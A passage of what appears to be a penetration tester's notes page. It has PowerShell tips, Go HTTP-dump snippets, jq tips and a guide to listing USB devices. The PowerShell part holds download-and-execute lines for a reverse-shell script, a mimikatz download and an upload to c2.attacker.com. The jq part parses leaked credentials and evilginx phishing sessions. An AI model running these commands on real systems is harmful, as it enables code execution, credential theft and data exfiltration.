<li>For executing in powershell directly (i.e. interactive powershell), you must use a Grave Accent symbol before the three(3) double quotes.
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-70-1"><a id="__codelineno-70-1" name="__codelineno-70-1" href="#__codelineno-70-1"></a>    <span class="n">powershell</span> <span class="n">-Exec</span> <span class="n">Bypass</span> <span class="n">-c</span> <span class="s2">&quot;IEX(New-Object System.Net.WebClient).DownloadString(</span><span class="se">`&quot;</span><span class="s2">&quot;&quot;http://10.0.1.5:1337/reverse.ps1</span><span class="se">`&quot;</span><span class="s2">&quot;&quot;)&quot;</span>
</span></code></pre></div></li>
<li>BEWARE: This does not seem to work if you are to encode the whole command (IEX...). Better to encode payload/command from Windows to see if it gives an error</li>
</ul>
<h3 id="download-uploading-files">Download &amp; Uploading files</h3>
<ul>
<li>Ignore bad/untrusted/self-signed certificates
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-71-1"><a id="__codelineno-71-1" name="__codelineno-71-1" href="#__codelineno-71-1"></a>    <span class="no">[System.Net.ServicePointManager]</span><span class="p">::</span><span class="n">ServerCertificateValidationCallback</span> <span class="p">=</span> <span class="p">{</span><span class="nv">$true</span><span class="p">}</span>
</span></code></pre></div></li>
<li>Download only <a href="[Siongui](https://siongui.github.io/2018/03/06/go-print-http-response-header/)">^1</a>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-72-1"><a id="__codelineno-72-1" name="__codelineno-72-1" href="#__codelineno-72-1"></a>    <span class="nb">Invoke-WebRequest</span> <span class="s2">&quot;http://&lt;KALI_IP&gt;:8000/mimikatz.zip&quot;</span> <span class="n">-Out</span> <span class="n">mimikatz</span><span class="p">.</span><span class="n">zip</span>
</span><span id="__span-72-2"><a id="__codelineno-72-2" name="__codelineno-72-2" href="#__codelineno-72-2"></a>
</span><span id="__span-72-3"><a id="__codelineno-72-3" name="__codelineno-72-3" href="#__codelineno-72-3"></a>    <span class="p">(</span><span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="n">DownloadFile</span><span class="p">(</span><span class="s2">&quot;https://example.com/archive.zip&quot;</span><span class="p">,</span> <span class="s2">&quot;C:\Windows\Temp\archive.zip&quot;</span><span class="p">)</span>  
</span><span id="__span-72-4"><a id="__codelineno-72-4" name="__codelineno-72-4" href="#__codelineno-72-4"></a>
</span><span id="__span-72-5"><a id="__codelineno-72-5" name="__codelineno-72-5" href="#__codelineno-72-5"></a>    <span class="nv">$client</span> <span class="p">=</span> <span class="nb">new-object</span> <span class="n">System</span><span class="p">.</span><span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span>
</span><span id="__span-72-6"><a id="__codelineno-72-6" name="__codelineno-72-6" href="#__codelineno-72-6"></a>    <span class="nv">$client</span><span class="p">.</span><span class="n">DownloadFile</span><span class="p">(</span><span class="s2">&quot;http://&lt;KALI_IP&gt;:8000/mimikatz.zip&quot;</span><span class="p">,</span><span class="s2">&quot;mimikatz.zip&quot;</span><span class="p">)</span>
</span></code></pre></div></li>
<li>Download and execute
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-73-1"><a id="__codelineno-73-1" name="__codelineno-73-1" href="#__codelineno-73-1"></a>    <span class="n">IEX</span><span class="p">(</span><span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="n">DownloadString</span><span class="p">(</span><span class="s2">&quot;https://10.0.1.5:1337/reverse.ps1&quot;</span><span class="p">)</span>
</span><span id="__span-73-2"><a id="__codelineno-73-2" name="__codelineno-73-2" href="#__codelineno-73-2"></a>    <span class="n">powershell</span> <span class="n">-Exec</span> <span class="n">Bypass</span> <span class="n">-c</span> <span class="s2">&quot;IEX(New-Object System.Net.WebClient).DownloadString(</span><span class="se">`&quot;</span><span class="s2">&quot;&quot;http://10.0.1.5:1337/reverse.ps1</span><span class="se">`&quot;</span><span class="s2">&quot;&quot;)&quot;</span>
</span></code></pre></div></li>
<li>Uploading files</li>
<li>Setup a <a href="/network/data_exfiltration/windows-linux-curl-simplehttpserverwithupload.md#projectdiscovery-simplehttpserver">Simple HTTP Server</a> for this command.
<div class="language-text highlight"><pre><span></span><code><span id="__span-74-1"><a id="__codelineno-74-1" name="__codelineno-74-1" href="#__codelineno-74-1"></a>    $uri = &quot;https://c2.attacker.com/bh.zip&quot;
</span><span id="__span-74-2"><a id="__codelineno-74-2" name="__codelineno-74-2" href="#__codelineno-74-2"></a>    $uploadPath = &quot;C:\Windows\temp\20210101000109_BloodHound.zip&quot;
</span><span id="__span-74-3"><a id="__codelineno-74-3" name="__codelineno-74-3" href="#__codelineno-74-3"></a>    Invoke-RestMethod -Uri $uri -Method Put -InFile $uploadPath -UseDefaultCredentials
</span></code></pre></div></li>
</ul>
<h3 id="cat-tail-grep-in-windows-ps">cat, tail, grep in Windows PS</h3>
<ul>
<li>Reading Files
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-75-1"><a id="__codelineno-75-1" name="__codelineno-75-1" href="#__codelineno-75-1"></a>    <span class="nb">Get-Content</span> <span class="n">output</span><span class="p">.</span><span class="n">log</span>
</span></code></pre></div></li>
<li>Tail
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-76-1"><a id="__codelineno-76-1" name="__codelineno-76-1" href="#__codelineno-76-1"></a>    <span class="nb">Get-Content</span> <span class="n">output</span><span class="p">.</span><span class="n">log</span> <span class="n">-Tail</span> <span class="p">&lt;</span><span class="n">number</span> <span class="n">of</span> <span class="n">lines</span><span class="p">&gt;</span>
</span><span id="__span-76-2"><a id="__codelineno-76-2" name="__codelineno-76-2" href="#__codelineno-76-2"></a>    <span class="nb">Get-Content</span> <span class="n">output</span><span class="p">.</span><span class="n">log</span> <span class="n">-Tail</span> <span class="n">10</span>
</span></code></pre></div></li>
<li>Tail -f
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-77-1"><a id="__codelineno-77-1" name="__codelineno-77-1" href="#__codelineno-77-1"></a>    <span class="nb">Get-Content</span> <span class="n">output</span><span class="p">.</span><span class="n">log</span> <span class="n">-Tail</span> <span class="n">10</span> <span class="n">-Wait</span>
</span></code></pre></div></li>
<li>Grep
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-78-1"><a id="__codelineno-78-1" name="__codelineno-78-1" href="#__codelineno-78-1"></a>    <span class="nb">Get-Content</span> <span class="n">output</span><span class="p">.</span><span class="n">log</span> <span class="p">|</span> <span class="nb">Select-String</span> <span class="n">-Pattern</span> <span class="s2">&quot;&lt;pattern&gt;&quot;</span>
</span><span id="__span-78-2"><a id="__codelineno-78-2" name="__codelineno-78-2" href="#__codelineno-78-2"></a>    <span class="nb">Get-Content</span> <span class="n">output</span><span class="p">.</span><span class="n">log</span> <span class="p">|</span> <span class="nb">Select-String</span> <span class="n">-Pattern</span> <span class="s2">&quot;password&quot;</span>
</span></code></pre></div></li>
<li>Grep -A 3
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-79-1"><a id="__codelineno-79-1" name="__codelineno-79-1" href="#__codelineno-79-1"></a>    <span class="nb">Get-Content</span> <span class="n">output</span><span class="p">.</span><span class="n">log</span> <span class="p">|</span> <span class="nb">Select-String</span> <span class="n">-Pattern</span> <span class="s2">&quot;password&quot;</span> <span class="n">-Context</span> <span class="n">0</span><span class="p">,</span><span class="n">3</span>
</span></code></pre></div></li>
<li>Tail -f | Grep -A 3
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-80-1"><a id="__codelineno-80-1" name="__codelineno-80-1" href="#__codelineno-80-1"></a>    <span class="nb">Get-Content</span> <span class="n">output</span><span class="p">.</span><span class="n">log</span> <span class="n">-Tail</span> <span class="n">10</span> <span class="n">-Wait</span> <span class="p">|</span> <span class="nb">Select-String</span> <span class="n">-Pattern</span> <span class="s2">&quot;password&quot;</span> <span class="n">-Context</span> <span class="n">0</span><span class="p">,</span><span class="n">3</span>
</span></code></pre></div></li>
</ul>
<h3 id="find-files-and-contents">Find files and contents</h3>
<ul>
<li>Find files with using filenames
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-81-1"><a id="__codelineno-81-1" name="__codelineno-81-1" href="#__codelineno-81-1"></a>    <span class="nb">Get-ChildItem</span> <span class="s2">&quot;C:\&quot;</span> <span class="n">-recurse</span> <span class="n">-filter</span> <span class="s2">&quot;*password*&quot;</span>
</span></code></pre></div></li>
<li>Find contents in files
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-82-1"><a id="__codelineno-82-1" name="__codelineno-82-1" href="#__codelineno-82-1"></a>    <span class="nb">Get-ChildItem</span> <span class="s2">&quot;C:\Users&quot;</span> <span class="n">-recurse</span> <span class="p">|</span> <span class="nb">Select-String</span> <span class="n">-pattern</span> <span class="s2">&quot;passw&quot;</span> <span class="p">|</span> <span class="nb">group </span><span class="n">path</span> <span class="p">|</span> <span class="nb">select </span><span class="n">name</span>
</span></code></pre></div></li>
</ul>
<h3 id="expand-archives">Expand Archives</h3>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-83-1"><a id="__codelineno-83-1" name="__codelineno-83-1" href="#__codelineno-83-1"></a><span class="nb">Expand-Archive</span> <span class="n">Procdump</span><span class="p">.</span><span class="n">zip</span> <span class="n">-DestinationPath</span> <span class="s2">&quot;C:\temp\&quot;</span> <span class="n">-Force</span> <span class="n">-Verbose</span>
</span></code></pre></div>
<h3 id="compress-and-archive">Compress and Archive</h3>
<ul>
<li><a href="/network/data_exfiltration/windows-archiving_and_compression#powershell">Powershell 5.0 and greater</a></li>
<li>Powershell 3.0 [^6]
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-84-1"><a id="__codelineno-84-1" name="__codelineno-84-1" href="#__codelineno-84-1"></a>    <span class="nb">Add-Type</span> <span class="n">-A</span> <span class="s1">&#39;System.IO.Compression.FileSystem&#39;</span>
</span><span id="__span-84-2"><a id="__codelineno-84-2" name="__codelineno-84-2" href="#__codelineno-84-2"></a>    <span class="no">[IO.Compression.ZipFile]</span><span class="p">::</span><span class="n">CreateFromDirectory</span><span class="p">(</span><span class="s2">&quot;C:\Windows\Temp\folderContainingLsassDMP&quot;</span><span class="p">,</span> <span class="s1">&#39;C:\Windows\temp\lsass.zip&#39;</span><span class="p">)</span>
</span></code></pre></div></li>
</ul>
<h3 id="base64-encode-powershell-commands">Base64 Encode Powershell commands</h3>
<ul>
<li>Some use cases:</li>
<li>Encoding<a href="[StackOverflow](https://stackoverflow.com/questions/1583219/how-to-do-a-recursive-find-replace-of-a-string-with-awk-or-sed)">^2</a> <a href="/windows/shellsl#one-liners">Powershell one-liners</a>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-85-1"><a id="__codelineno-85-1" name="__codelineno-85-1" href="#__codelineno-85-1"></a><span class="nv">$MYCOMAND</span> <span class="p">=</span> <span class="s2">&quot;Invoke-WebRequest -Uri &#39;http://www.contoso.com&#39; -OutFile &#39;C:\path\file&#39;&quot;</span>
</span><span id="__span-85-2"><a id="__codelineno-85-2" name="__codelineno-85-2" href="#__codelineno-85-2"></a><span class="nv">$ENCODED</span> <span class="p">=</span> <span class="no">[Convert]</span><span class="p">::</span><span class="n">ToBase64String</span><span class="p">(</span><span class="no">[Text.Encoding]</span><span class="p">::</span><span class="n">Unicode</span><span class="p">.</span><span class="n">GetBytes</span><span class="p">(</span><span class="nv">$MYCOMMAND</span><span class="p">))</span>
</span><span id="__span-85-3"><a id="__codelineno-85-3" name="__codelineno-85-3" href="#__codelineno-85-3"></a><span class="nb">Write-Output</span> <span class="nv">$ENCODED</span>
</span></code></pre></div></li>
</ul>
<h3 id="list-directory-and-sort-by-date-time">List directory and sort by Date Time</h3>
<ul>
<li>Useful when trying to delete any files written to disk (i.e. procdump64.exe/lsassy.exe) and need to sort out through bunch of files (i.e. C:\Windows\temp)</li>
<li>Command Prompt
<div class="language-text highlight"><pre><span></span><code><span id="__span-86-1"><a id="__codelineno-86-1" name="__codelineno-86-1" href="#__codelineno-86-1"></a>    dir /od
</span></code></pre></div></li>
<li>Powershell (sorted by date(LastWriteTime). For sorting via other datetime fields, just press “TAB”)
<div class="language-text highlight"><pre><span></span><code><span id="__span-87-1"><a id="__codelineno-87-1" name="__codelineno-87-1" href="#__codelineno-87-1"></a>    Get-ChildItem .\|Sort-Object LastWriteTime
</span></code></pre></div></li>
</ul>
<h3 id="tasklist">Tasklist</h3>
<ul>
<li>Find PID of a process</li>
<li>CMD
<div class="language-text highlight"><pre><span></span><code><span id="__span-88-1"><a id="__codelineno-88-1" name="__codelineno-88-1" href="#__codelineno-88-1"></a>    tasklist /fi &quot;imagename eq lsass.exe&quot;
</span></code></pre></div></li>
<li>Powershell
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-89-1"><a id="__codelineno-89-1" name="__codelineno-89-1" href="#__codelineno-89-1"></a>    <span class="nb">Get-Process</span> <span class="n">lsass</span>
</span></code></pre></div></li>
</ul>
<h3 id="taskkill">Taskkill</h3>
<ul>
<li>Killing tasks after <code>tasklist /V</code> <a href="[Phoenixnap](https://phoenixnap.com/kb/iptables-tutorial-linux-firewall)">^5</a></li>
<li>Useful when killing command and process which did not working and pressing ++ctrl+c++ exited the whole terminal
<div class="language-text highlight"><pre><span></span><code><span id="__span-90-1"><a id="__codelineno-90-1" name="__codelineno-90-1" href="#__codelineno-90-1"></a>taskkill /PID 1234
</span><span id="__span-90-2"><a id="__codelineno-90-2" name="__codelineno-90-2" href="#__codelineno-90-2"></a>taskkill /F /IM cmd.exe
</span></code></pre></div></li>
</ul>
<h2 id="print-all-http-response-headers">Print all HTTP Response Headers</h2>
<p>Including Status code <a href="[Siongui](https://siongui.github.io/2018/03/06/go-print-http-response-header/)">^1</a></p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-91-1"><a id="__codelineno-91-1" name="__codelineno-91-1" href="#__codelineno-91-1"></a>fmt.Printf(&quot;RESPONSE:\n&quot;)
</span><span id="__span-91-2"><a id="__codelineno-91-2" name="__codelineno-91-2" href="#__codelineno-91-2"></a>fmt.Println(resp.Status)
</span><span id="__span-91-3"><a id="__codelineno-91-3" name="__codelineno-91-3" href="#__codelineno-91-3"></a>for k, v := range resp.Header {
</span><span id="__span-91-4"><a id="__codelineno-91-4" name="__codelineno-91-4" href="#__codelineno-91-4"></a>  fmt.Print(k)
</span><span id="__span-91-5"><a id="__codelineno-91-5" name="__codelineno-91-5" href="#__codelineno-91-5"></a>  fmt.Print(&quot; : &quot;)
</span><span id="__span-91-6"><a id="__codelineno-91-6" name="__codelineno-91-6" href="#__codelineno-91-6"></a>  fmt.Println(v)
</span><span id="__span-91-7"><a id="__codelineno-91-7" name="__codelineno-91-7" href="#__codelineno-91-7"></a>}
</span></code></pre></div>
<h2 id="print-full-http-request-and-response">Print Full HTTP Request and Response</h2>
<p>Includes Headers and Body in a well formatted way <a href="[StackOverflow](https://stackoverflow.com/questions/1583219/how-to-do-a-recursive-find-replace-of-a-string-with-awk-or-sed)">^2</a>
* Request
* "<em>Use <code>httputil.DumpRequest()</code> if you want to pretty-print the request on the server side.</em>"
* "<em>Use <code>httputil.DumpRequestOut()</code> if you want to dump the request on the client side.</em>"
<div class="language-text highlight"><pre><span></span><code><span id="__span-92-1"><a id="__codelineno-92-1" name="__codelineno-92-1" href="#__codelineno-92-1"></a>    reqDump, err := httputil.DumpRequestOut(req, true)
</span><span id="__span-92-2"><a id="__codelineno-92-2" name="__codelineno-92-2" href="#__codelineno-92-2"></a>    if err != nil {
</span><span id="__span-92-3"><a id="__codelineno-92-3" name="__codelineno-92-3" href="#__codelineno-92-3"></a>        log.Fatal(err)
</span><span id="__span-92-4"><a id="__codelineno-92-4" name="__codelineno-92-4" href="#__codelineno-92-4"></a>    }
</span><span id="__span-92-5"><a id="__codelineno-92-5" name="__codelineno-92-5" href="#__codelineno-92-5"></a>
</span><span id="__span-92-6"><a id="__codelineno-92-6" name="__codelineno-92-6" href="#__codelineno-92-6"></a>    fmt.Printf(&quot;REQUEST:\n%s&quot;, string(reqDump))
</span></code></pre></div></p>
<ul>
<li>Response
<div class="language-text highlight"><pre><span></span><code><span id="__span-93-1"><a id="__codelineno-93-1" name="__codelineno-93-1" href="#__codelineno-93-1"></a>    respDump, err := httputil.DumpResponse(resp, true)
</span><span id="__span-93-2"><a id="__codelineno-93-2" name="__codelineno-93-2" href="#__codelineno-93-2"></a>    if err != nil {
</span><span id="__span-93-3"><a id="__codelineno-93-3" name="__codelineno-93-3" href="#__codelineno-93-3"></a>        log.Fatal(err)
</span><span id="__span-93-4"><a id="__codelineno-93-4" name="__codelineno-93-4" href="#__codelineno-93-4"></a>    }
</span><span id="__span-93-5"><a id="__codelineno-93-5" name="__codelineno-93-5" href="#__codelineno-93-5"></a>
</span><span id="__span-93-6"><a id="__codelineno-93-6" name="__codelineno-93-6" href="#__codelineno-93-6"></a>    fmt.Printf(&quot;RESPONSE:\n%s&quot;, string(respDump))
</span></code></pre></div></li>
</ul>
<p><a href="[StackOverflow](https://stackoverflow.com/questions/1583219/how-to-do-a-recursive-find-replace-of-a-string-with-awk-or-sed)">^2</a>: <a href="https://gosamples.dev/print-http-request-response/">Go Samples</a></p>
<h1 id="jq-tips">JQ tips</h1>
<h2 id="disclaimer">Disclaimer</h2>
<p>There is no need for this nonsense. Refer to this awesome person: <a href="https://lzone.de/cheat-sheet/jq">Lzone jq cheatsheet</a></p>
<h2 id="installation">Installation</h2>
<p><code>sudo apt install jq</code></p>
<hr />
<h2 id="filtering-grepping-for-specific-key-values-then-selecting-a-specific-key-afterwards">Filtering (Grepping) for specific key values, then selecting a specific key afterwards</h2>
<ul>
<li>Example given: Bloohound collector’s json data. Finding hosts with Unconstrained Delegation.
<div class="language-text highlight"><pre><span></span><code><span id="__span-94-1"><a id="__codelineno-94-1" name="__codelineno-94-1" href="#__codelineno-94-1"></a>cat 20210401_computers.json|jq &#39;.computers[] |select(.Properties.unconstraineddelegation ==true) | .Properties.name&#39;
</span></code></pre></div></li>
</ul>
<h2 id="printing-2-or-more-values">Printing 2 or more values</h2>
<ul>
<li>Example: For priting the email and password/hashed_password from dehashed at the same time
<div class="language-text highlight"><pre><span></span><code><span id="__span-95-1"><a id="__codelineno-95-1" name="__codelineno-95-1" href="#__codelineno-95-1"></a>cat dehashed.txt|jq &#39;.entries[] | {email,password}&#39;
</span><span id="__span-95-2"><a id="__codelineno-95-2" name="__codelineno-95-2" href="#__codelineno-95-2"></a>cat evilginx_sessions.json|jq -r &#39;keys[] as $k | &quot;\(.[$k] | .name)=\(.[$k] | .value)&quot;&#39; 
</span></code></pre></div></li>
</ul>
<h1 id="how-to-list-usb-devices-on-linux-command-line">How to list USB devices on linux command line</h1>
<p>The following Gist describes the use of different commands to list all USB devices. Feel free to comment and contribute.</p>
<h2 id="table-of-contents">Table of Contents</h2>
<ol>
<li><a href="#first">DF Command</a></li>
<li><a href="#second">PARTED Command</a></li>
<li><a href="#third">FDISK Command</a></li>
<li><a href="#fourth">LSBLK Command</a></li>
<li><a href="#fifth">FINDMNT Command</a></li>
<li><a href="#sixth">LSUSB Command</a></li>
</ol>
<h3 id="1-first-option-df-command">1. First option - DF Command <a name="first"></a></h3>
<p>What you probably are looking for is the <code>df</code> command. This command (which reports the file system disk space usage) can be used along with <code>grep</code> to only print the lines that match the patterns we require, in our case, <strong>media</strong>. As no file name is given, it will look for mounted file systems so <strong>if your USB is encrypted and not already mounted it won't be displayed.</strong></p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-96-1"><a id="__codelineno-96-1" name="__codelineno-96-1" href="#__codelineno-96-1"></a>df -Th | grep media
</span></code></pre></div>
<p>Where the output is:</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-97-1"><a id="__codelineno-97-1" name="__codelineno-97-1" href="#__codelineno-97-1"></a>device name                                     mounted on
</span><span id="__span-97-2"><a id="__codelineno-97-2" name="__codelineno-97-2" href="#__codelineno-97-2"></a>/dev/sda       ext2       58G   52M   55G   1% /media/user/device
</span></code></pre></div>
<table>
<thead>
<tr>
<th>Option</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>-T</td>
<td>Print file system type</td>
</tr>
<tr>
<td>-h</td>
<td>Human readable (print sizes in powers of 1024)</td>
</tr>
<tr>
<td>-H</td>
<td>Print sizes in powers of 1000</td>
</tr>
</tbody>
</table>
<h3 id="2-second-option-parted-command">2. Second option - PARTED Command <a name="second"></a></h3>
<p>In this case we are going to list the USB devices using a partition manipulation program. This command is named <code>parted</code> and requires superuser (root) privileges.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-98-1"><a id="__codelineno-98-1" name="__codelineno-98-1" href="#__codelineno-98-1"></a>sudo parted -l
</span></code></pre></div>
<p>Where the output is:</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-99-1"><a id="__codelineno-99-1" name="__codelineno-99-1" href="#__codelineno-99-1"></a>Model: Vendors model (scsi)
</span><span id="__span-99-2"><a id="__codelineno-99-2" name="__codelineno-99-2" href="#__codelineno-99-2"></a>Disk /dev/sda: 62,9GB
</span><span id="__span-99-3"><a id="__codelineno-99-3" name="__codelineno-99-3" href="#__codelineno-99-3"></a>Sector size (logical/physical): 512B/512B
</span><span id="__span-99-4"><a id="__codelineno-99-4" name="__codelineno-99-4" href="#__codelineno-99-4"></a>Partition Table: loop
</span><span id="__span-99-5"><a id="__codelineno-99-5" name="__codelineno-99-5" href="#__codelineno-99-5"></a>Disk Flags: 
</span><span id="__span-99-6"><a id="__codelineno-99-6" name="__codelineno-99-6" href="#__codelineno-99-6"></a>
</span><span id="__span-99-7"><a id="__codelineno-99-7" name="__codelineno-99-7" href="#__codelineno-99-7"></a>Number  Start  End     Size    File system  Flags
</span><span id="__span-99-8"><a id="__codelineno-99-8" name="__codelineno-99-8" href="#__codelineno-99-8"></a> 1      0,00B  62,9GB  62,9GB  ext2
</span><span id="__span-99-9"><a id="__codelineno-99-9" name="__codelineno-99-9" href="#__codelineno-99-9"></a>
</span><span id="__span-99-10"><a id="__codelineno-99-10" name="__codelineno-99-10" href="#__codelineno-99-10"></a>
</span><span id="__span-99-11"><a id="__codelineno-99-11" name="__codelineno-99-11" href="#__codelineno-99-11"></a>Model: Your computer (nvme)
</span><span id="__span-99-12"><a id="__codelineno-99-12" name="__codelineno-99-12" href="#__codelineno-99-12"></a>Disk /dev/nvme0n1: 256GB
</span><span id="__span-99-13"><a id="__codelineno-99-13" name="__codelineno-99-13" href="#__codelineno-99-13"></a>Sector size (logical/physical): 512B/512B
</span><span id="__span-99-14"><a id="__codelineno-99-14" name="__codelineno-99-14" href="#__codelineno-99-14"></a>Partition Table: gpt
</span><span id="__span-99-15"><a id="__codelineno-99-15" name="__codelineno-99-15" href="#__codelineno-99-15"></a>Disk Flags: 
</span><span id="__span-99-16"><a id="__codelineno-99-16" name="__codelineno-99-16" href="#__codelineno-99-16"></a>
</span><span id="__span-99-17"><a id="__codelineno-99-17" name="__codelineno-99-17" href="#__codelineno-99-17"></a>Number  Start   End     Size    File system     Name                  Flags
</span><span id="__span-99-18"><a id="__codelineno-99-18" name="__codelineno-99-18" href="#__codelineno-99-18"></a> 1      1049kB  538MB   537MB   fat32           EFI System Partition  boot
</span><span id="__span-99-19"><a id="__codelineno-99-19" name="__codelineno-99-19" href="#__codelineno-99-19"></a> 2      538MB   2685MB  2147MB  linux-swap(v1)                        swap
</span><span id="__span-99-20"><a id="__codelineno-99-20" name="__codelineno-99-20" href="#__codelineno-99-20"></a> 3      2685MB  4833MB  2147MB  zfs
</span><span id="__span-99-21"><a id="__codelineno-99-21" name="__codelineno-99-21" href="#__codelineno-99-21"></a> 4      4833MB  256GB   251GB   zfs
</span></code></pre></div>
<table>
<thead>
<tr>
<th>Option</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>-l</td>
<td>Lists partition layout on all block devices</td>
</tr>
<tr>
<td>-m</td>
<td>Use it along with <code>-l</code> option to display machine parseable output</td>
</tr>
</tbody>
</table>
<h3 id="3-third-option-fdisk-command">3. Third option - FDISK Command <a name="third"></a></h3>
<p>The third option also requires the use of <code>sudo</code> to list the disk partition table with the command <code>fdisk</code>.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-100-1"><a id="__codelineno-100-1" name="__codelineno-100-1" href="#__codelineno-100-1"></a>sudo fdisk -l | grep /dev/s
</span></code></pre></div>
<p>Where the output is:</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-101-1"><a id="__codelineno-101-1" name="__codelineno-101-1" href="#__codelineno-101-1"></a>      name
</span><span id="__span-101-2"><a id="__codelineno-101-2" name="__codelineno-101-2" href="#__codelineno-101-2"></a>Disk  /dev/sda:     58,61 GiB, 62914560000 bytes, 122880000 sectors
</span></code></pre></div>
<table>
<thead>
<tr>
<th>Option</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>-l</td>
<td>List the partition tables for the specified devices and then exit.  If no devices  are given, those mentioned in /proc/partitions are used</td>
</tr>
</tbody>
</table>
<h3 id="4-fourth-option-lsblk-command">4. Fourth option - LSBLK Command <a name="fourth"></a></h3>
<p>Here the command lists block devices. The command prints all block devices (except RAM disks) in a tree-like format by default. <code>sudo blkid | grep sd</code> can also be used.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-102-1"><a id="__codelineno-102-1" name="__codelineno-102-1" href="#__codelineno-102-1"></a>lsblk | grep sd
</span></code></pre></div>
<p>Where the output is:</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-103-1"><a id="__codelineno-103-1" name="__codelineno-103-1" href="#__codelineno-103-1"></a>sda    8:0    1  58,6G  0 disk /media/user/device
</span></code></pre></div>
<h3 id="5-fifth-option-findmnt-command">5. Fifth option - FINDMNT Command <a name="fifth"></a></h3>
<p><code>findmnt</code> will list all mounted filesystems or search for a filesystem so <strong>if your USB is encrypted and not already mounted it won't be shown.</strong></p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-104-1"><a id="__codelineno-104-1" name="__codelineno-104-1" href="#__codelineno-104-1"></a>findmnt | grep media
</span></code></pre></div>
<p>Where the output is:</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-105-1"><a id="__codelineno-105-1" name="__codelineno-105-1" href="#__codelineno-105-1"></a>└─/media/user/device /dev/sda       ext2       rw,nosuid,nodev,relatime
</span></code></pre></div>
<h3 id="6-sixth-option-lsusb-command">6. Sixth option - LSUSB Command <a name="sixth"></a></h3>
<p>This option won't tell where the device is mounted or how it is called but list all USB devices and display information about its buses in the system and the devices connected to them. Type only one <code>-v</code> to show less information, two <code>-vv</code> for full information. Once you have identified the <code>bus</code> and <code>dev</code> variables of your USB device, then you could <code>grep</code> them to <code>usb-devices</code> for even more information.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-106-1"><a id="__codelineno-106-1" name="__codelineno-106-1" href="#__codelineno-106-1"></a>lsusb -tvv
</span></code></pre></div>
<p>Where the output is:</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-107-1"><a id="__codelineno-107-1" name="__codelineno-107-1" href="#__codelineno-107-1"></a>/:  Bus 02.Port 1: Dev 1, Class=root_hub, Driver=xhci_hcd/6p, 5000M
</span><span id="__span-107-2"><a id="__codelineno-107-2" name="__codelineno-107-2" href="#__codelineno-107-2"></a>    ID 1d6b:0003 Linux Foundation 3.0 root hub
</span><span id="__span-107-3"><a id="__codelineno-107-3" name="__codelineno-107-3" href="#__codelineno-107-3"></a>    /sys/bus/usb/devices/usb2  /dev/bus/usb/002/001
</span><span id="__span-107-4"><a id="__codelineno-107-4" name="__codelineno-107-4" href="#__codelineno-107-4"></a>/:  Bus 01.Port 1: Dev 1, Class=root_hub, Driver=xhci_hcd/12p, 480M
</span><span id="__span-107-5"><a id="__codelineno-107-5" name="__codelineno-107-5" href="#__codelineno-107-5"></a>    ID 1d6b:0002 Linux Foundation 2.0 root hub
</span><span id="__span-107-6"><a id="__codelineno-107-6" name="__codelineno-107-6" href="#__codelineno-107-6"></a>    /sys/bus/usb/devices/usb1  /dev/bus/usb/001/001
</span><span id="__span-107-7"><a id="__codelineno-107-7" name="__codelineno-107-7" href="#__codelineno-107-7"></a>    |__ Port 1: Dev 22, If 0, Class=Mass Storage, Driver=usb-storage, 480M
</span><span id="__span-107-8"><a id="__codelineno-107-8" name="__codelineno-107-8" href="#__codelineno-107-8"></a>        ID 0930:6544 Toshiba Corp. TransMemory-Mini / Kingston DataTraveler 2.0 Stick
</span><span id="__span-107-9"><a id="__codelineno-107-9" name="__codelineno-107-9" href="#__codelineno-107-9"></a>        /sys/bus/usb/devices/1-1  /dev/bus/usb/001/022
</span><span id="__span-107-10"><a id="__codelineno-107-10" name="__codelineno-107-10" href="#__codelineno-107-10"></a>    |__ Port 5: Dev 3, If 3, Class=Video, Driver=uvcvideo, 480M
</span><span id="__span-107-11"><a id="__codelineno-107-11" name="__codelineno-107-11" href="#__codelineno-107-11"></a>        ID 05c8:0815 Cheng Uei Precision Industry Co., Ltd (Foxlink) 
</span><span id="__span-107-12"><a id="__codelineno-107-12" name="__codelineno-107-12" href="#__codelineno-107-12"></a>        /sys/bus/usb/devices/1-5  /dev/bus/usb/001/003
</span><span id="__span-107-13"><a id="__codelineno-107-13" name="__codelineno-107-13" href="#__codelineno-107-13"></a>    |__ Port 5: Dev 3, If 1, Class=Video, Driver=uvcvideo, 480M
</span><span id="__span-107-14"><a id="__codelineno-107-14" name="__codelineno-107-14" href="#__codelineno-107-14"></a>        ID 05c8:0815 Cheng Uei Precision Industry Co., Ltd (Foxlink) 
